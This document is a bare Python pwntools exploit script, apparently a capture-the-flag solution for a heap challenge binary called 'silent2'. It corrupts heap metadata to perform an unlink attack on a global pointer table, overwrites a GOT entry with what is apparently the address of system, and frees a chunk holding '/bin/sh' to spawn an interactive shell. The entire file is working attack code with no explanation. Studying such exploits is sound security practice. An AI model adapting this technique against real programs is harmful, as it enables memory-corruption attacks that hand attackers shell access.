from pwn import *

p=process("./silent2")

def add(size,content):
    time.sleep(0.2)
    p.sendline("1")
    time.sleep(0.2)
    p.sendline(str(size))
    time.sleep(0.2)
    p.sendline(content)

def delete(idx):
    time.sleep(0.2)
    p.sendline("2")
    time.sleep(0.2)
    p.sendline(str(idx))

def edit(idx,content):
    time.sleep(0.2)
    p.sendline("3")
    time.sleep(0.2)
    p.sendline(str(idx))
    time.sleep(0.2)
    p.sendline(content)

if __name__=="__main__":
    s=0x6020C0
    add(0x90,'a'*0x8f)
    add(0x90,'b'*0x8f)
    add(0x90,"/bin/sh\x00")
    add(0x90,'c'*0x8f)
    add(0xa0,'d'*0x9f)
    add(0x100,'5'*0xff)
    delete(3)
    delete(4)
    payload=p64(0)+p64(0x90)
    payload+=p64(s)+p64(s+0x8)
    payload=payload.ljust(0x90,'a')
    payload+=p64(0x90)+p64(0xb0)
    add(0x130,payload)
    delete(4)
    edit(3,p64(0x602018))
    edit(0,p64(0x400730))
    delete(2)
    p.interactive()


